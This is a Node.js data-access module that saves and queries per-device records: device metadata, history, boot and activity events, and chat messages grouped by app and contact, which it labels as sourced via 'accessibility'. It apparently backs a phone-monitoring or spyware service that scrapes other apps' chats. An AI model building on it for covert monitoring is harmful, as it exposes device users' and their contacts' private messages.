'use strict';

const DeviceMeta = require('../models/DeviceMeta');
const History = require('../models/History');
const ChatMessage = require('../models/ChatMessage');
const BootStatus = require('../models/BootStatus');
const ActivityEvent = require('../models/ActivityEvent');

async function upsertDevice(deviceId, data) {
    const id = String(deviceId || '').trim().toUpperCase();
    if (!id) return null;
    return DeviceMeta.findOneAndUpdate(
        { deviceId: id },
        { $set: { ...data, deviceId: id, updatedAt: new Date() } },
        { upsert: true, new: true }
    ).lean();
}

async function saveHistory(deviceId, type, data) {
    const id = String(deviceId || '').trim().toUpperCase();
    if (!id || !type) return null;
    return History.create({
        deviceId: id,
        type: String(type),
        data: data || {},
        createdAt: new Date(),
    });
}

async function loadHistory(deviceId, type, limit) {
    const id = String(deviceId || '').trim().toUpperCase();
    const lim = Math.min(parseInt(limit, 10) || 500, 2000);
    const q = { deviceId: id };
    if (type) q.type = String(type);
    return History.find(q).sort({ createdAt: -1 }).limit(lim).lean();
}

async function saveChatMessages(deviceId, appKey, list) {
    const id = String(deviceId || '').trim().toUpperCase();
    if (!id || !Array.isArray(list) || !list.length) return 0;
    let n = 0;
    for (const msg of list) {
        try {
            const msgKey = msg.msgKey || `${appKey}|${msg.conversation || ''}|${msg.timestamp || Date.now()}|${(msg.text || '').slice(0, 40)}`;
            await ChatMessage.updateOne(
                { deviceId: id, app: appKey, msgKey },
                {
                    $setOnInsert: {
                        deviceId: id,
                        app: appKey,
                        conversation: msg.conversation || msg.contact || '',
                        contact: msg.contact || msg.conversation || '',
                        text: msg.text || msg.message || '',
                        message: msg.text || msg.message || '',
                        direction: msg.direction || 'unknown',
                        type: msg.type || 'TEXT',
                        source: msg.source || 'accessibility',
                        timestamp: msg.timestamp || Date.now(),
                        clientTimestamp: msg.clientTimestamp || 0,
                        serverTimestamp: Date.now(),
                        eventId: msg.eventId || '',
                        msgKey,
                    },
                },
                { upsert: true }
            );
            n++;
        } catch (e) {
            // duplicate key etc.
        }
    }
    return n;
}

async function loadChatMessages(deviceId, appKey, contact, limit) {
    const id = String(deviceId || '').trim().toUpperCase();
    const lim = Math.min(parseInt(limit, 10) || 200, 1000);
    const q = { deviceId: id };
    if (appKey && appKey !== 'all') q.app = appKey;
    if (contact && contact !== 'all') {
        q.$or = [{ conversation: contact }, { contact }];
    }
    return ChatMessage.find(q).sort({ timestamp: -1 }).limit(lim).lean();
}

async function loadChatContacts(deviceId, appKey) {
    const id = String(deviceId || '').trim().toUpperCase();
    const match = { deviceId: id };
    if (appKey && appKey !== 'all') match.app = appKey;
    const rows = await ChatMessage.aggregate([
        { $match: match },
        {
            $group: {
                _id: { app: '$app', conversation: '$conversation' },
                lastMessage: { $max: '$timestamp' },
                count: { $sum: 1 },
            },
        },
        { $sort: { lastMessage: -1 } },
        { $limit: 200 },
    ]);
    return rows.map((r) => ({
        app: r._id.app,
        conversation: r._id.conversation,
        contact: r._id.conversation,
        lastMessage: r.lastMessage,
        count: r.count,
    }));
}

async function saveBootStatus(deviceId, payload) {
    const id = String(deviceId || '').trim().toUpperCase();
    if (!id) return null;
    const eventKey = payload.eventKey || `${id}|${payload.bootSessionId}|${payload.eventType}|${payload.timestamp || Date.now()}`;
    try {
        return await BootStatus.findOneAndUpdate(
            { deviceId: id, eventKey },
            {
                $setOnInsert: {
                    deviceId: id,
                    bootSessionId: payload.bootSessionId || '',
                    eventType: payload.eventType || 'unknown',
                    serviceName: payload.serviceName || '',
                    status: payload.status || 'SUCCESS',
                    message: payload.message || '',
                    eventKey,
                    timestamp: payload.timestamp || Date.now(),
                },
            },
            { upsert: true, new: true }
        ).lean();
    } catch (e) {
        return null;
    }
}

async function loadAllBootEvents(deviceId, limit) {
    const id = String(deviceId || '').trim().toUpperCase();
    const lim = Math.min(parseInt(limit, 10) || 100, 500);
    return BootStatus.find({ deviceId: id }).sort({ timestamp: -1 }).limit(lim).lean();
}

async function loadLatestBootStatus(deviceId) {
    const id = String(deviceId || '').trim().toUpperCase();
    return BootStatus.findOne({ deviceId: id }).sort({ timestamp: -1 }).lean();
}

async function loadActivityEvents(deviceId, limit) {
    const id = String(deviceId || '').trim().toUpperCase();
    const lim = Math.min(parseInt(limit, 10) || 100, 500);
    return ActivityEvent.find({ deviceId: id }).sort({ timestamp: -1 }).limit(lim).lean();
}

async function clearActivityEvents(deviceId) {
    const id = String(deviceId || '').trim().toUpperCase();
    await ActivityEvent.deleteMany({ deviceId: id });
    return true;
}

module.exports = {
    upsertDevice,
    saveHistory,
    loadHistory,
    saveChatMessages,
    loadChatMessages,
    loadChatContacts,
    saveBootStatus,
    loadAllBootEvents,
    loadLatestBootStatus,
    loadActivityEvents,
    clearActivityEvents,
};
